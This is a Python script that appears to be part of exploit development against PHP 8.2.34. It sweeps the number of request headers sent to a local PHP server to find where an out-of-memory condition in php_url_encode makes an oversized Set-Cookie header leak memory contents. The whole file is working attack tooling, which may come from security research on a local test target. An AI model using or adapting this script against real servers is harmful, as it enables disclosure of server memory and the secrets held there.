#!/usr/bin/env python3
"""Sweep nheaders to find the OOM-in-php_url_encode sweet spot on 8.2.34."""
import os
import sys, time
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "php72"))
import drive as D

PORT = 18111

def try_n(nheaders):
    try:
        c = D.Conn("127.0.0.1", PORT, False)
        c.get("/")
        c.close()
    except Exception:
        pass
    time.sleep(0.5)
    body = D.arm_body(nheaders, b"a:\n", b"\x00")
    try:
        c = D.Conn("127.0.0.1", PORT, False)
        r = c.post("/index.php", body, False, maxread=65536)
        sc = r.get("headers", {}).get("set-cookie", "")
        status = r["status"]
        clen = len(sc)
        c.close()
    except Exception as e:
        status, clen = f"ERR:{e}", 0
    return status, clen, len(body)

# Sweep: from low (no OOM) to high (OOM in parser) to find the php_url_encode window
for n in [100000, 200000, 400000, 600000, 800000, 1000000, 1100000, 1200000,
          1250000, 1299740, 1299760, 1299780, 1300000, 1350000, 1400000, 1500000]:
    st, clen, bsz = try_n(n)
    leak = "  <-- LEAK!" if clen > 100 else ""
    oom = "  [OOM]" if "memory size" in st.lower() or "memory size" in (st or "") else ""
    print(f"n={n:>8}  body={bsz:>9}  status={st[:30]:<30}  cookie={clen:>6}{leak}")
    time.sleep(0.3)
